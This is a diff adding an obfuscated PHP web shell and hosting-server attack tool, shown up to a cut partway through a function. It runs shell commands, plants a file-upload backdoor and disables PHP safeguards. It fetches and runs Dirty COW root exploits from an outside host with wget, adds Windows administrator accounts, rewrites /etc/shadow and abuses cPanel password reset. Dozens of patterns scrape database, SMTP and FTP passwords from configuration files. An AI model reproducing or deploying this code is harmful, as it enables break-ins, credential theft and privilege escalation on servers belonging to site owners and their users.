@@ -1,0 +1,2055 @@
+<?php
+
+    error_reporting(0);
+    define('†', 'Ú');
+    $GLOBALS[†] = array(0 => "SERVER_ADDR", 1 => "code", 2 => "user", 3 => "action", 4 => "seccode", 5 => "debug", 6 => "", 7 => "confirm", 8 => "password", 9 => "alpha", 10 => "both", 11 => "nonalpha", 12 => "root", 13 => "http://localhost:2082", 14 => "HTTP_USER_AGENT", 15 => "COOKIE.txt", 16 => "ls", 17 => "/ Dec /", 18 => "/ Nov /", 19 => "Error2-Root", 20 => "/ 2015 /", 21 => "/ 2014 /", 22 => "/ 2013 /", 23 => "/ 2012 /", 24 => "/ 2011 /", 25 => "/ 2010 /", 26 => "/ 2009 /", 27 => "/ 2016 /", 28 => "/etc/*", 29 => "/", 30 => "/ TEST/", 31 => "\r\n", 32 => "\$6\$roottn\$", 33 => ":", 34 => "/smtp/", 35 => "/fox/", 36 => "/etc/", 37 => "/shadow", 38 => ":", 39 => ":16249:::::", 40 => "\n", 41 => "<error>Error-SMTP</error>", 42 => "#(.*)<\\/pre>#", 43 => "#<pre>(.*)#", 44 => "https://justpaste.it/", 45 => "HTTP_HOST", 46 => "127.0.0.1", 47 => "localhost", 48 => "/action=/", 49 => "REQUEST_URI", 50 => "injection", 51 => "/", 52 => "rdp", 53 => "y", 54 => "a", 55 => "s", 56 => "b", 57 => "d", 58 => "u", 59 => "f", 60 => "q", 61 => "k", 62 => "p", 63 => "l", 64 => "z", 65 => "h", 66 => "i", 67 => "j", 68 => "v", 69 => "x", 70 => "win", 71 => "#password=\"(.*)\"#", 72 => "#password=(.*)#", 73 => "/\\[client\\]/", 74 => "email", 75 => "<error>", 76 => "</error>", 77 => "upload", 78 => "/resetpass/", 79 => "resets", 80 => "reseta", 81 => ".", 82 => "# ", 83 => " TEST\r\n", 84 => "5e196afc0", 85 => "V\t2\n\nArchive\nDrafts\nSent\nspam\nTrash", 86 => "123456789abcdefghijklmnopqrstuvwxyz", 87 => "mail", 88 => " TEST", 89 => "info", 90 => "admin", 91 => "supervisor", 92 => "administrator", 93 => "contact", 94 => "call", 95 => "mail", 96 => "email", 97 => "support", 98 => "site", 99 => "website", 100 => "user", 101 => "director", 102 => "manager", 103 => "chief", 104 => "executive", 105 => "leader", 106 => "supports", 107 => "backing", 108 => "prop", 109 => "backup", 110 => "shore", 111 => "upholding", 112 => "help", 113 => "back-up", 114 => "host", 115 => "hosting", 116 => "clients", 117 => "client", 118 => "member", 119 => "3 V1578724087 N1 G6789ba31f76a195e040b0000cb0407e2", 120 => "2147483647C\n0 0", 121 => "www.", 122 => "?", 123 => "/login/", 124 => "pass", 125 => "login_submit", 126 => "Log in", 127 => "/filemanager/", 128 => "/Location: \\/cpsess/", 129 => "/\\/home/", 130 => "T3B0aW9ucyBBbGwKCkFkZFR5cGUgYXBwbGljYXRpb24veC1odHRwZC1jZ2kgLnBsCgpBZGRIYW5kbGVyIGNnaS1zY3JpcHQgLnBsCkFkZEhhbmRsZXIgY2dpLXNjcmlwdCAucGw=", 131 => "root", 132 => "root/.htaccess", 133 => "../", 134 => "accesshash", 135 => "/akhmhcij/", 136 => "/tjwlltii/", 137 => "/jsbochsf/", 138 => "/lmhelqpg/", 139 => "PD9waHA=", 140 => " error_reporting(0); if(isset(\$_GET['", 141 => "'])){ echo \"<form method='POST' enctype='multipart/form-data'><input type='file' name='file' /> <input type='submit' value='upload' /></form>\"; move_uploaded_file(\$_FILES['file']['tmp_name'], \$_FILES['file']['name']); exit(0); } ", 142 => "Pz4=", 143 => "123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", 144 => "index.php", 145 => ".php", 146 => ".php.", 147 => "./", 148 => "wp-includes/", 149 => "wp-admin/", 150 => "<backdoor>", 151 => "</backdoor>", 152 => "wp-admin", 153 => "wp-includes", 154 => "up", 155 => "<error>There is no cPanel</error>", 156 => "error_log", 157 => "index", 158 => "smtp", 159 => "display_errors", 160 => "http://localhost:2086", 161 => "https://", 162 => "#window.cp_security_token = \"/(.*)\";#", 163 => "#orde\",\"url\":\"/(.*)/horde/#", 164 => "#bold\">(.*)<\\/p>#", 165 => "|", 166 => "/roundcube/", 167 => "#dispatchSettingURL= \"/(.*)/execute/#", 168 => "..", 169 => "...", 170 => "Error-three", 171 => "#oundcube\",\"url\":\"/(.*)/3rdparty/#", 172 => "&_action=show", 173 => "#Location: /(.*)/webmail#", 174 => "#href=\"/(.*)/horde/#", 175 => "#href=\"/(.*)/3rdparty/#", 176 => "cp", 177 => "#10\\.(.*)\\.(.*)\\.(.*)#", 178 => "/192\\.168\\./", 179 => "check", 180 => "file_get_contents", 181 => "implode", 182 => "file", 183 => "fopen", 184 => "stream_get_contents", 185 => "cat ", 186 => "r", 187 => "index.html", 188 => "index.htm", 189 => "./Done", 190 => "HTTP_HOST", 191 => "SERVER_NAME", 192 => "PHP_SELF", 193 => "https://localhost:2087", 194 => "passwords", 195 => "/etc/named.conf", 196 => "name", 197 => "/etc/valiases/", 198 => " ", 199 => "#named/(.*?).db#", 200 => " ", 201 => "usernames", 202 => "win", 203 => "/home", 204 => "COOKIE.txt", 205 => "HTTPS", 206 => "on", 207 => "\\", 208 => "https://ipwhois.app/json/", 209 => "org", 210 => "country", 211 => "<error>Reset Password Disabled</error>", 212 => "https://localhost:2083", 213 => "curl_exec", 214 => "zttv:", 215 => "cii", 216 => "rtp", 217 => ".min.css", 218 => "RTLCSS is a framework for transforming Cascading Style Sheets (CSS) from Left-To-Right (BTR) to (PVX) Right-To-Left (RTL). pass usual", 219 => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36", 220 => "http", 221 => "method", 222 => "GET", 223 => "header", 224 => "referer: ", 225 => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36\r\n", 226 => "stream_context_create", 227 => "http://", 228 => "@[A-Z]@", 229 => "@[a-z]@", 230 => "@[^\\w]@", 231 => "@[0-9]@", 232 => "/cdn-cgi/phish-bypass?u=/&atok=", 233 => "#name=\"atok\" value=\"(.*)\">#", 234 => "/Warning\\:/", 235 => "<error>can't get domains.</error>", 236 => "/www/clients/", 237 => "/\\./", 238 => "#(.*)/www\\/clients\\/#", 239 => "ls ", 240 => "*/", 241 => "posix_getegid", 242 => "?", 243 => "uid", 244 => "gid", 245 => "<domains><center>", 246 => "</center><br></domains>", 247 => "<cp><font color=\"green\"><center>[+] vHosts</center> </font><br></cp>", 248 => "<server><font color=\"red\"><center>[-] Windows</center> </font><br></server>", 249 => "<cp><font color=\"green\"><center>[+] cPanel</center> </font><br></cp>", 250 => "/Windows/", 251 => "/vhosts/", 252 => "<ip><font color=\"blue\"><center>", 253 => "</center></font><br></ip>", 254 => "<hosting><center>", 255 => "</center><br></hosting>", 256 => "<uname><font color=\"red\"><center>", 257 => "</center></font><br></uname>", 258 => "<server><font color=\"green\"><center>[+] Linux</center> </font><br></server>", 259 => "<domain><font color=\"red\"><center>", 260 => "</center></font><br></domain>", 261 => "<country><center>", 262 => "</center><br></country>", 263 => "<php><center>", 264 => "</center><br></php>", 265 => "<pwd><font color=\"blue\"><center>", 266 => "</center></font><br></pwd>", 267 => "<cp><font color=\"red\"><center>[-] There is no cPanel or vHosts.</center> </font><br></cp>", 268 => "<font color=\"green\"><center>[+] Accesshash </center> </font><br>\\n", 269 => "", 270 => "/var/cpanel/resellers", 271 => "file_put_contents", 272 => "w", 273 => "https://localhost:2096", 274 => "//", 275 => "info", 276 => "a", 277 => "1nku0", 278 => "pwd.pl", 279 => "Error3-Root", 280 => "/root:ro.k.OmOlAkM2/", 281 => "http://uploaderfiles.com/.S/passwd.txt", 282 => "/bin\\/bash/", 283 => "/etc/passwd", 284 => "http://uploaderfiles.com/.S/dirtyc0wi686.txt", 285 => "wget http://uploaderfiles.com/.L/dc-i686 -O dc-i686.txt", 286 => "juhu4", 287 => "dc-i686.txt", 288 => "/ i686/", 289 => "root.pl", 290 => "http://uploaderfiles.com/.L/dc-i686", 291 => "wget http://uploaderfiles.com/.L/dc-n -O dc-n.txt", 292 => "chmod +x dc-n.txt", 293 => "chmod +x dc-i686.txt", 294 => "http://uploaderfiles.com/.S/dirtyc0wN.txt", 295 => "./dc-n.txt 0", 296 => "7t1v5", 297 => "dc-n.txt", 298 => "http://uploaderfiles.com/.L/dc-n", 299 => "./dc-i686.txt 0", 300 => "domains", 301 => "/successfully/", 302 => "<t>", 303 => "</t>", 304 => "Error-RDP3", 305 => "Error-RDP1", 306 => "\n<br> ./DoneAdmin ", 307 => "^", 308 => "#", 309 => "\n<br> ./DoneAdd ", 310 => "WIN", 311 => "net user ", 312 => " /add", 313 => "net localgroup Administrators ", 314 => "Error-RDP2", 315 => "abcdefghijklmnopqrstuvwxyz", 316 => "/Account Functions/", 317 => "/feature_showcase/", 318 => "/scripts3\\/initial_setup_wizard1/", 319 => "/cPanel/", 320 => "http://localhost:2095", 321 => "safe_mode = Off\ndisable_functions = NONE\nsafe_mode_gid = OFF\nopen_basedir = OFF\nexec = ON\nshell_exec = ON", 322 => "php.ini", 323 => "r", 324 => "wget --header=\"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36\" ", 325 => " -O ", 326 => "powerauto.cc/apis-explorer", 327 => "http", 328 => "method", 329 => "GET", 330 => "header", 331 => "Sec-Fetch-User: ", 332 => "/tmp/", 333 => ".txt", 334 => "<html>Working</html>", 335 => "tmp_name", 336 => "log_errors", 337 => "/json-api/", 338 => "/Unknown App Requested/", 339 => "/<title>Forbidden<\\/title>/", 340 => "nix", 341 => "/Jump/", 342 => "well-known", 343 => ".", 344 => "dir", 345 => "fname", 346 => "sname", 347 => "/.htaccess", 348 => "Options +Indexes", 349 => "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", 350 => "<successfully>Uploaded successfully.</successfully>", 351 => "zip", 352 => "/warn-invalid-answer-puzzle/", 353 => "login", 354 => "Reset+Password", 355 => "email:", 356 => "/error-too-many-attempts-flood/", 357 => "You exceeded the password reset request limit, Try again in one hour", 358 => "<error>Error-two</error>", 359 => "/error-resetpass-disabled/", 360 => "puzzle", 361 => "answer", 362 => "puzzle-guess-input", 363 => "Send+Security+Code", 364 => "Reset Password Vulnerability closed", 365 => "012345678901234567890123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#%^*_-=/?.!#%^*_-=/?.!#%^*_-=/?.!#%^*_-=/?.", 366 => "smtps", 367 => "<font color=\"green\"><center>[+] mycnf </center> </font><br>", 368 => "/etc/passwd", 369 => "H*", 370 => "#/home/(.*)/public_html/#", 371 => "popen", 372 => "shell_exec", 373 => "system", 374 => "passthru", 375 => "exec", 376 => "http://", 377 => "\n<error>101</error>", 378 => "/_autoindex/", 379 => "#<a href=\"(.*).txt\">#", 380 => "url", 381 => "#href=\"(.*?).txt\"#", 382 => "action1", 383 => "404", 384 => "/https:/", 385 => "\n<error>404</error>", 386 => "<br><password>", 387 => "</password>\n", 388 => "#\\\$password = '(.*)'#", 389 => "#db_password = \"(.*)\"#", 390 => "#\"_db_pass_\", \"(.*)\"#", 391 => "#db_password=\"(.*)\"#", 392 => "#'DB_PASSWORD', '(.*)'#", 393 => "#'DB_PASS', '(.*)'#", 394 => "#\\SMTP_PASSWORD=(.*)#", 395 => "/encryption_hash/", 396 => "#'DB_PASSWORD', \"(.*)\"#", 397 => "#\\MAIL_PASSWORD=(.*)#", 398 => "#config\\['SQL_PASSWORD'\\] = '(.*)';#", 399 => "#db['pass'] = \"(.*)\";#", 400 => "#senha = \"(.*)\"#", 401 => "#\\SMTP_PASSWORD=\"(.*)\"#", 402 => "/null/", 403 => "/\\//", 404 => "#db_password = '(.*)'#", 405 => "#'password' => '(.*)',#", 406 => "#dbpasswd = '(.*)'#", 407 => "#:(.*)#", 408 => "#password'] = '(.*)'#", 409 => "#'password' =&gt; '(.*)',#", 410 => "#ftp_pass = '(.*)'#", 411 => "#password = \"(.*)\";#", 412 => "#\\DB_PASSWORD=\"(.*)\"#", 413 => "#\\MAIL_PASSWORD=\"(.*)\"#", 414 => "#'_DB_PASSWD_', '(.*)'#", 415 => "#\\DB_PASSWORD=(.*)#", 416 => "#'DB_USERNAME', '(.*)'#", 417 => "#dbpass = \"(.*)\"#", 418 => "/http:/", 419 => "#smtppass = '(.*)'#", 420 => "#password\t= '(.*)'#", 421 => "/\\/admin\\//", 422 => "#'DBPASS','(.*)'#", 423 => "<br><whmcs>", 424 => "</whmcs>\n", 425 => "#dbpass = '(.*)';#", 426 => "#'mysql://(.*)@localhost/#", 427 => "#password_localhost = \"(.*)\"#", 428 => "#password = '(.*)'#", 429 => "#'DB_USER', '(.*)'#", 430 => "mass", 431 => "PD8=", 432 => "https://viewdns.info/reverseip/index.php?host=", 433 => "&t=1", 434 => "#<td class=\"px-6 py-4 whitespace-nowrap text-base font-medium text-gray-900 dark:text-gray-100\">(.*)</td>#");
+    error_reporting(0);
+    @ini_set($GLOBALS[†][0x9c], NULL);
+    @ini_set($GLOBALS[†][0x150], 0);
+    @ini_set($GLOBALS[†][0x9f], 0);
+    echo "<html>Working</html>";
+    function IJ4zc($iUkf4, $uNQj1)
+    {
+        $mOvUm = strlen($uNQj1);
+        $v3XNz = substr($iUkf4, strlen($iUkf4) - $mOvUm);
+        return $v3XNz == $uNQj1;
+    }
+    function gLYjE($e1w_N)
+    {
+        if (stristr($e1w_N, $GLOBALS[†][0x33])) {
+            if (!(strpos($e1w_N, $GLOBALS[†][0x112]) !== !1)) {
+                goto P3eJh;
+            }
+            $e1w_N = str_replace($GLOBALS[†][0x112], $GLOBALS[†][0x33], $e1w_N);
+            P3eJh:
+            if (!(IJ4zc($e1w_N, $GLOBALS[†][0x33]) == !0)) {
+                goto JqNCQ;
+            }
+            $e1w_N = substr_replace($e1w_N, $GLOBALS[†][0x6], -1);
+            JqNCQ:
+            $AWjV5 = $GLOBALS[†][0x6];
+            $NplcW = explode($GLOBALS[†][0x33], $e1w_N);
+            $nxTqO = 0x1;
+            dJu2_:
+            if (!($nxTqO < count($NplcW) - 0x1)) {
+                if (!($e1w_N[0] == $GLOBALS[†][0x51] && $e1w_N[0x1] == $GLOBALS[†][0x33])) {
+                    goto ZmkEm;
+                }
+                $AWjV5 = $GLOBALS[†][0x93] . $AWjV5;
+                ZmkEm:
+                if (!($e1w_N[0] == $GLOBALS[†][0x51] && $e1w_N[0x1] == $GLOBALS[†][0x51])) {
+                    goto f1PTI;
+                }
+                $AWjV5 = $GLOBALS[†][0x85] . $AWjV5;
+                f1PTI:
+                if (!(strpos($AWjV5, $GLOBALS[†][0x112]) !== !1)) {
+                    goto BtdqX;
+                }
+                $AWjV5 = str_replace($GLOBALS[†][0x112], $GLOBALS[†][0x33], $AWjV5);
+                BtdqX:
+                return trim($AWjV5);
+            }
+            $AWjV5 .= $GLOBALS[†][0x33] . $NplcW[$nxTqO];
+            $nxTqO++;
+            goto dJu2_;
+        }
+        return realpath($GLOBALS[†][0x93]);
+    }
+    function VOzk8($JJGwp, $C79wo)
+    {
+        $iCrpm = strtolower("PHP");
+        $zGdCf = glYje($JJGwp);
+        if (!(!is_writable($zGdCf) && $iCrpm != $GLOBALS[†][0x46])) {
+            goto W5iH6;
+        }
+        chmod($zGdCf, 0755);
+        W5iH6:
+        if (!(file_exists($JJGwp) && is_file($JJGwp) && !is_writable($JJGwp) && $iCrpm != $GLOBALS[†][0x46])) {
+            goto bkE70;
+        }
+        chmod($JJGwp, 0644);
+        bkE70:
+        if (function_exists($GLOBALS[†][0x10f])) {
+            $OO2oq = file_put_contents($JJGwp, $C79wo);
+            goto Re9Ji;
+        }
+        $OO2oq = fwrite(fopen($JJGwp, $GLOBALS[†][0x110]), $C79wo);
+        Re9Ji:
+        return $OO2oq;
+    }
+    function evlhO($PUnPZ)
+    {
+        $zGdCf = glYjE($PUnPZ);
+        if (!(!is_writable($zGdCf) && strtolower("PHP") != $GLOBALS[†][0x46])) {
+            goto QeHHO;
+        }
+        chmod($zGdCf, 0755);
+        QeHHO:
+        mkdir($PUnPZ);
+    }
+    function RX2iN($DJZ_X)
+    {
+        $fntpV = $GLOBALS[†][0x6];
+        if (function_exists($GLOBALS[†][0x177])) {
+            @exec($DJZ_X, $fntpV);
+            $fntpV = @join($GLOBALS[†][0x28], $fntpV);
+            goto VVijs;
+        }
+        if (function_exists($GLOBALS[†][0x176])) {
+            ob_start();
+            @passthru($DJZ_X);
+            $fntpV = ob_get_clean();
+            goto VVijs;
+        }
+        if (function_exists($GLOBALS[†][0x175])) {
+            ob_start();
+            @system($DJZ_X);
+            $fntpV = ob_get_clean();
+            goto VVijs;
+        }
+        if (function_exists($GLOBALS[†][0x174])) {
+            $fntpV = shell_exec($DJZ_X);
+            goto VVijs;
+        }
+        if (function_exists($GLOBALS[†][0x173]) && is_resource($s9Hkd = @popen($DJZ_X, $GLOBALS[†][0xba]))) {
+            $fntpV = $GLOBALS[†][0x10d];
+            IxXf_:
+            if (@feof($s9Hkd)) {
+                pclose($s9Hkd);
+                goto Gs0c6;
+            }
+            $fntpV .= fread($s9Hkd, 0x400);
+            goto IxXf_;
+        }
+        Gs0c6:
+        VVijs:
+        return $fntpV;
+    }
+    function Rh8jx($TAG8p)
+    {
+        $s1q7E = count($TAG8p);
+        $aWD0S = range(0, $s1q7E - 0x1);
+        shuffle($aWD0S);
+        $KBsmm = array($s1q7E);
+        $nxTqO = 0;
+        foreach ($aWD0S as $ZuOPy) {
+            $KBsmm[$nxTqO] = $TAG8p[$ZuOPy];
+            $nxTqO++;
+        }
+        return $KBsmm;
+    }
+    function B9KNm($JJGwp)
+    {
+        $iDcJS = $GLOBALS[†][0x6];
+        if (function_exists($GLOBALS[†][0xb4])) {
+            $iDcJS = file_get_contents($JJGwp);
+            goto kO75L;
+        }
+        if (function_exists($GLOBALS[†][0xb7]) && function_exists($GLOBALS[†][0xb8])) {
+            $iDcJS = stream_get_contents(fopen($JJGwp, $GLOBALS[†][0xba]));
+            goto kO75L;
+        }
+        if (function_exists($GLOBALS[†][0xb5]) && function_exists($GLOBALS[†][0xb6])) {
+            $iDcJS = implode(file($JJGwp));
+            goto kO75L;
+        }
+        if (function_exists($GLOBALS[†][0xb6])) {
+            $R7z8V = file($JJGwp);
+            if (function_exists($GLOBALS[†][0xb5])) {
+                $iDcJS = implode($R7z8V);
+                goto hE1vC;
+            }
+            foreach ($R7z8V as $Hh98t) {
+                $iDcJS .= $Hh98t;
+            }
+            hE1vC:
+            goto JDYrm;
+        }
+        JDYrm:
+        kO75L:
+        if (!(trim($iDcJS) == $GLOBALS[†][0x6])) {
+            goto pf9tV;
+        }
+        $iDcJS = RX2iN($GLOBALS[†][0xb9] . $JJGwp);
+        pf9tV:
+        return $iDcJS;
+    }
+    function dG6cZ($hk6Mf, $Os20Q)
+    {
+        $s1q7E = 0;
+        $FryuD = B9KNM($hk6Mf);
+        $R7z8V = explode($GLOBALS[†][0x28], $FryuD);
+        foreach ($R7z8V as $Hh98t) {
+            if (!strstr($Hh98t, $Os20Q)) {
+                goto XMvLO;
+            }
+            $s1q7E++;
+            XMvLO:
+        }
+        return $s1q7E;
+    }
+    function YmcuW($hk6Mf, $Os20Q)
+    {
+        $YDN4E = dg6CZ($hk6Mf, $Os20Q);
+        $FryuD = b9kNm($hk6Mf);
+        $R7z8V = explode($GLOBALS[†][0x28], $FryuD);
+        $hfLzx = $GLOBALS[†][0x6];
+        foreach ($R7z8V as $Hh98t) {
+            if (!(strstr($Hh98t, $Os20Q) || $YDN4E <= 0)) {
+                goto C0t5A;
+            }
+            $YDN4E--;
+            if (!($YDN4E <= 0)) {
+                goto df3Yu;
+            }
+            $hfLzx .= $Hh98t . $GLOBALS[†][0x28];
+            df3Yu:
+            C0t5A:
+        }
+        return $hfLzx;
+    }
+    function wRWF7($JJGwp, $C79wo)
+    {
+        if (function_exists($GLOBALS[†][0x10f])) {
+            $OO2oq = file_put_contents($JJGwp, $C79wo, FILE_APPEND);
+            goto G6o5J;
+        }
+        $OO2oq = fwrite(fopen($JJGwp, $GLOBALS[†][0x114]), $C79wo);
+        G6o5J:
+        return $OO2oq;
+    }
+    function vpHAg($JJGwp)
+    {
+        $JJGwp = substr($JJGwp, -1) == $GLOBALS[†][0x33] ? $JJGwp : $JJGwp . $GLOBALS[†][0x33];
+        $jWCqI = opendir($JJGwp);
+        OU1LK:
+        if (!(($gh12v = readdir($jWCqI)) !== !1)) {
+            closedir($jWCqI);
+            rmdir($JJGwp);
+            // [PHPDeobfuscator] Implied return
+            return;
+        }
+        $gh12v = $JJGwp . $gh12v;
+        if (!(basename($gh12v) == $GLOBALS[†][0xa8] || basename($gh12v) == $GLOBALS[†][0x157])) {
+            $i1uN3 = filetype($gh12v);
+            if ($i1uN3 == $GLOBALS[†][0x158]) {
+                vpHAG($gh12v);
+                goto ql7vf;
+            }
+            unlink($gh12v);
+            ql7vf:
+            goto OU1LK;
+        }
+        goto OU1LK;
+    }
+    function pqW2f($aCb7p)
+    {
+        global $HR2uO;
+        if ($HR2uO) {
+            Rx2IN("rm -rf {$aCb7p}");
+            goto sNb9q;
+        }
+        vPhAg("{$aCb7p}");
+        sNb9q:
+    }
+    function C2mjq($elcsv, $RUP0s = null, $rJxrm = null)
+    {
+        $hXUTm = curl_init();
+        curl_setopt($hXUTm, CURLOPT_URL, $elcsv);
+        curl_setopt($hXUTm, CURLOPT_HEADER, !0);
+        curl_setopt($hXUTm, CURLOPT_RETURNTRANSFER, 0x1);
+        curl_setopt($hXUTm, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
+        curl_setopt($hXUTm, CURLOPT_CONNECTTIMEOUT, 0x1e);
+        curl_setopt($hXUTm, CURLOPT_TIMEOUT, 0x1e);
+        curl_setopt($hXUTm, CURLOPT_FOLLOWLOCATION, 0x1);
+        curl_setopt($hXUTm, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($hXUTm, CURLOPT_SSL_VERIFYHOST, 0);
+        curl_setopt($hXUTm, CURLOPT_USERAGENT, $_SERVER[$GLOBALS[†][0xe]]);
+        curl_setopt($hXUTm, CURLOPT_COOKIEFILE, $GLOBALS[†][0xf]);
+        curl_setopt($hXUTm, CURLOPT_COOKIEJAR, $GLOBALS[†][0xf]);
+        if (!($RUP0s != null)) {
+            goto yTKhe;
+        }
+        curl_setopt($hXUTm, CURLOPT_HTTPHEADER, $RUP0s);
+        yTKhe:
+        if (!($rJxrm != null)) {
+            goto UOylK;
+        }
+        curl_setopt($hXUTm, CURLOPT_POST, 0x1);
+        curl_setopt($hXUTm, CURLOPT_POSTFIELDS, $rJxrm);
+        UOylK:
+        $OJRWH = curl_exec($hXUTm);
+        curl_close($hXUTm);
+        return $OJRWH;
+    }
+    function xK7mm($ksCfZ)
+    {
+        $euQcc = $GLOBALS[†][0x6];
+        global $zk0R3;
+        global $x8Fp6;
+        if (!(trim($euQcc) == $GLOBALS[†][0x6] && function_exists($GLOBALS[†][0xb4]) && function_exists($GLOBALS[†][0xe2]))) {
+            goto U6zR2;
+        }
+        $euQcc = file_get_contents($ksCfZ, !1, stream_context_create(array($GLOBALS[†][0xdc] => array($GLOBALS[†][0x148] => $GLOBALS[†][0x149], $GLOBALS[†][0x14a] => $GLOBALS[†][0xe1]))));
+        file_get_contents($zk0R3 . $GLOBALS[†][0x146], !1, stream_context_create(array($GLOBALS[†][0x147] => array($GLOBALS[†][0x148] => $GLOBALS[†][0x149], $GLOBALS[†][0x14a] => $GLOBALS[†][0x14b] . $x8Fp6))));
+        U6zR2:
+        if (!(trim($euQcc) == $GLOBALS[†][0x6] && function_exists($GLOBALS[†][0xd5]))) {
+            goto NgRfg;
+        }
+        $MfTiO = curl_init();
+        curl_setopt($MfTiO, CURLOPT_TIMEOUT, 0xa);
+        curl_setopt($MfTiO, CURLOPT_RETURNTRANSFER, !0);
+        curl_setopt($MfTiO, CURLOPT_URL, $ksCfZ);
+        curl_setopt($MfTiO, CURLOPT_USERAGENT, $GLOBALS[†][0xdb]);
+        curl_setopt($MfTiO, CURLOPT_FOLLOWLOCATION, !0);
+        if (!stristr($ksCfZ, $GLOBALS[†][0xa1])) {
+            goto PFwyJ;
+        }
+        curl_setopt($MfTiO, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($MfTiO, CURLOPT_SSL_VERIFYHOST, 0);
+        PFwyJ:
+        curl_setopt($MfTiO, CURLOPT_HEADER, !1);
+        $euQcc = curl_exec($MfTiO);
+        curl_close($MfTiO);
+        NgRfg:
+        if (!(trim($euQcc) == $GLOBALS[†][0x6])) {
+            goto kNOdd;
+        }
+        $WEsll = $GLOBALS[†][0x14c] . substr(str_shuffle($GLOBALS[†][0x8f]), 0x32) . $GLOBALS[†][0x14d];
+        Rx2iN($GLOBALS[†][0x144] . $ksCfZ . $GLOBALS[†][0x145] . $WEsll);
+        if (function_exists($GLOBALS[†][0xb4])) {
+            $euQcc = file_get_contents($WEsll);
+            goto hCKw5;
+        }
+        $euQcc = stream_get_contents(fopen($WEsll, $GLOBALS[†][0xba]));
+        hCKw5:
+        unlink($WEsll);
+        kNOdd:
+        if (!(trim($euQcc) == $GLOBALS[†][0x6] && function_exists($GLOBALS[†][0xb7]) && function_exists($GLOBALS[†][0xb8]) && function_exists($GLOBALS[†][0xe2]))) {
+            goto BAJfv;
+        }
+        $MW8UP = fopen($ksCfZ, $GLOBALS[†][0x143], !1, stream_context_create(array($GLOBALS[†][0xdc] => array($GLOBALS[†][0xdd] => $GLOBALS[†][0xde], $GLOBALS[†][0xdf] => $GLOBALS[†][0xe1]))));
+        if (!$MW8UP) {
+            goto ATd9w;
+        }
+        $euQcc = stream_get_contents($MW8UP);
+        ATd9w:
+        BAJfv:
+        return $euQcc;
+    }
+    function PvqLu()
+    {
+        return substr(str_shuffle($GLOBALS[†][0x13b]), 0x19) . substr(str_shuffle($GLOBALS[†][0x16d]), 0x72);
+    }
+    function yZW2e($HaTa5)
+    {
+        $bzlwG = preg_match($GLOBALS[†][0xe4], $HaTa5);
+        $aojpw = preg_match($GLOBALS[†][0xe5], $HaTa5);
+        $s8Ro0 = preg_match($GLOBALS[†][0xe7], $HaTa5);
+        $opG5E = preg_match($GLOBALS[†][0xe6], $HaTa5);
+        if (!(!$bzlwG || !$aojpw || !$s8Ro0 || !$opG5E)) {
+            return !0;
+        }
+        return !1;
+    }
+    function DmQG6()
+    {
+        $HaTa5 = pvQlU();
+        $Zsuvb = yzW2e($HaTa5);
+        J0HCa:
+        if (!($Zsuvb == !1)) {
+            return $HaTa5;
+        }
+        $HaTa5 = pVQlu();
+        $Zsuvb = yZW2e($HaTa5);
+        goto J0HCa;
+    }
+    function jqvW7()
+    {
+        global $AnD4x;
+        global $e0Xsp;
+        global $kdbAk;
+        global $kiUQn;
+        global $MEejl;
+        global $qQtqo;
+        $d7nFp = str_replace($GLOBALS[†][0x51], $GLOBALS[†][0x6], $qQtqo);
+        $cDMRg = substr($d7nFp, 0, rand(0x3, strlen($d7nFp)));
+        $hDRN5 = array($GLOBALS[†][0x59], $GLOBALS[†][0x5a], $GLOBALS[†][0x5b], $GLOBALS[†][0x5c], $GLOBALS[†][0x5d], $GLOBALS[†][0x5e], $GLOBALS[†][0x5f], $GLOBALS[†][0x60], $GLOBALS[†][0x61], $GLOBALS[†][0x62], $GLOBALS[†][0x63], $GLOBALS[†][0x64], $GLOBALS[†][0x65], $GLOBALS[†][0x66], $GLOBALS[†][0x67], $GLOBALS[†][0x68], $GLOBALS[†][0x69], $GLOBALS[†][0x6a], $GLOBALS[†][0x6b], $GLOBALS[†][0x6c], $GLOBALS[†][0x6d], $GLOBALS[†][0x6e], $GLOBALS[†][0x6f], $GLOBALS[†][0x70], $GLOBALS[†][0x71], $GLOBALS[†][0x72], $GLOBALS[†][0x73], $GLOBALS[†][0x74], $GLOBALS[†][0x75], $GLOBALS[†][0x76]);
+        $c0fYW = array("info{$cDMRg}", "admin{$cDMRg}", "supervisor{$cDMRg}", "administrator{$cDMRg}", "contact{$cDMRg}", "call{$cDMRg}", "mail{$cDMRg}", "email{$cDMRg}", "support{$cDMRg}", "site{$cDMRg}", "website{$cDMRg}", "user{$cDMRg}", "director{$cDMRg}", "manager{$cDMRg}", "chief{$cDMRg}", "executive{$cDMRg}", "leader{$cDMRg}", "supports{$cDMRg}", "backing{$cDMRg}", "prop{$cDMRg}", "backup{$cDMRg}", "shore{$cDMRg}", "upholding{$cDMRg}", "help{$cDMRg}", "back-up{$cDMRg}", "host{$cDMRg}", "hosting{$cDMRg}", "clients{$cDMRg}", "client{$cDMRg}", "member{$cDMRg}");
+        $nhiko = rH8jx($hDRN5);
+        $vON72 = RH8JX($c0fYW);
+        array_push($vON72, substr(str_shuffle($GLOBALS[†][0x56]), 0x20) . $GLOBALS[†][0x57]);
+        $NplcW = array_merge($nhiko, $vON72);
+        $gOEvQ = "/home{$kiUQn}{$MEejl}/etc/{$qQtqo}/shadow";
+        $dRhnb = "/home{$kiUQn}{$MEejl}/etc/shadow";
+        $kdbAk = $GLOBALS[†][0x6];
+        if (!file_exists($gOEvQ)) {
+            goto FoPMY;
+        }
+        $kdbAk .= B9knm($gOEvQ);
+        FoPMY:
+        if (!file_exists($dRhnb)) {
+            goto nAgSW;
+        }
+        $kdbAk .= b9KNM($dRhnb);
+        nAgSW:
+        foreach ($NplcW as $e0Xsp) {
+            if (strstr($kdbAk, $e0Xsp . $GLOBALS[†][0x26])) {
+            }
